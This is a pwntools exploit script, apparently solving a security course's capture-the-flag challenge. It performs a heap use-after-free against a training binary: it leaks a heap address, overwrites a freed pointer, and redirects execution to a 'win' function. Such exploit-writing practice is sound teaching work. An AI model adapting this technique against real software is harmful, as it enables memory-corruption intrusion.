#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './usemedontabuseme' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 22488 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
win = p32(0x804967c)
free = p32(0x8049206)
name = b''
# Create first clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'0')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
# Create second clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'1')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
# Kill both clones
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'b')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'0')
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'b')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'1')
# Leak first clone address
p.recvuntil(b"Choice: ", drop=True)
p.sendline(b'd')
p.recvuntil(b"ID: ", drop=True)
p.sendline(b'1')
p.recvuntil(b"Name: ", drop=True)
leak = p.recvline()
leak = leak[0:4]
log.info(f"Leak is: {hex(u32(leak))}")
leak = u32(leak)+  0xc
# Rename first clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'c')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'0')
p.recvuntil(b"): ", drop=True)
p.sendline(p32(leak))
# Create three clones, the last clone with the win function
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'2')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'3')
p.recvuntil(b"): ", drop=True)
p.sendline(name)
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'a')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'4')
p.recvuntil(b"): ", drop=True)
p.sendline(win)
# Kill the second last clone
p.recvuntil(b"Choice: ", drop = True)
p.sendline(b'h')
p.recvuntil(b"Clone ID: ", drop=True)
p.sendline(b'3')

p.interactive()

